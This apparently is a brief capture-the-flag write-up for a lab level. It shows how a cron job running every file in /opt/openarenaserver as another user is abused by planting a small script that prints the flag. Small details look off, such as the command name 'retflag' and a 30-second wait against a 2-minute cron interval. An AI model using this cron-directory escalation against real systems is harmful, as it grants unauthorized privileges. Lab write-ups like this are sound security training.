After logging in as user level05, I received a message: 'You have a new mail.'

I then utilized the 'find' command to search for any file or directory with the name 'mail/level05/flag05.'
In /var/mail/level05, I discovered a crontab file:

```plaintext
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This crontab is set to execute the command 'sh /usr/sbin/openarenaserver' every 2 minutes with the user flag05.

Examining /usr/sbin/openarenaserver, I found the following script:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

This script runs every program in /opt/openarenaserver and removes them afterward.
Taking advantage of this, I created a script at /opt/openarenaserver/test:

```bash
#!/bin/sh
retflag | wall
```

After waiting for 30 seconds, I retrieved the flag.
